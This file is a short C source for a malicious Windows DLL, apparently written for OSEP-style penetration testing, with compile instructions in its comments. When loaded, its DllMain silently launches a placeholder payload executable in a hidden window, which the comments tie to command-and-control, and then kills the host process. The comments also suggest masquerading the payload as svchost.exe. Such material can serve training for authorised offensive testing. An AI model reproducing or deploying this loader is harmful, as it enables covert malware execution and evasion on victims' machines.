//  ┓      ┓       ┓  ┓   
// ┏┫┏┓┓┏┏┓┃┏┓┏┓┏┓┏┫  ┣┓┓┏
// ┗┻┗ ┗┛┗ ┗┗┛┣┛┗ ┗┻  ┗┛┗┫
//            ┛          ┛
// ┳┓┏┓┓┏┏┓┏┓┓┏┓          
// ┃┃ ┫┣┫┣┫┃ ┃┫           
// ┻┛┗┛┛┗┛┗┗┛┛┗┛          
// Thanks to ChatGPT and OSEP
// For best results use this script on Linux machine for compile
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// Your payload.exe must be in blabla here

#include <windows.h>

BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        STARTUPINFO si = {0};
        PROCESS_INFORMATION pi = {0};
        
        si.cb = sizeof(STARTUPINFO);

        // Path to your Payload executable
        // Better result use "C:\Windows\svchost.exe" original SVC Host located on System32 Folder
        LPCSTR command = "C:\\blabla.exe";

        // Create a new process for any exe where is c2
        if (CreateProcess(
                NULL,          // No module name (use command line)
                (LPSTR)command, // Command line
                NULL,          // Process handle not inheritable
                NULL,          // Thread handle not inheritable
                FALSE,         // No inheritance of handles
                CREATE_NO_WINDOW, // Run in a hidden window
                NULL,          // Use parent's environment block
                NULL,          // Use parent's starting directory 
                &si,           // Pointer to STARTUPINFO structure
                &pi            // Pointer to PROCESS_INFORMATION structure
        )) {
            // Close handles to the created process and its primary thread.
            // Some frameworks might monitor process exits, so handle cleanup appropriately.
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        } else {
            // Error handling: GetLastError can provide details
        }

        // Terminate the DLL to prevent further processing
        ExitProcess(0);
    }
    return TRUE;
}